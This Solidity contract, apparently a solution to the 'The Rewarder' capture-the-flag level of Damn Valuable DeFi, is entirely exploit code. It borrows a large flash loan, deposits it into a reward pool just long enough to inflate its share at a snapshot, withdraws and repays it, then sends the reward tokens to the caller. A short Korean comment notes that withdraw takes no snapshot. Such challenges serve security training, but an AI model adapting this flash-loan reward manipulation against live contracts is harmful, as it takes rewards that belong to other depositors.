// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {RewardToken} from "./RewardToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract HackRewarder {
    FlashLoanerPool pool;
    DamnValuableToken token;
    TheRewarderPool rewarder;
    AccountingToken accountingToken;
    RewardToken rewardToken;

    constructor(
        FlashLoanerPool _pool,
        DamnValuableToken _token,
        TheRewarderPool _rewarder
    ) {
        pool = _pool;
        token = _token;
        rewarder = _rewarder;
        accountingToken = AccountingToken(_rewarder.accountingToken());
        rewardToken = RewardToken(_rewarder.rewardToken());
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(rewarder), amount);
        rewarder.deposit(amount);

        // withdraw에는 snapshot이 없음
        rewarder.withdraw(amount);
        token.transfer(address(pool), amount);
    }

    function hack() external {
        pool.flashLoan(1000000 ether);
    }

    function getReward() external {
        rewarder.distributeRewards();
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
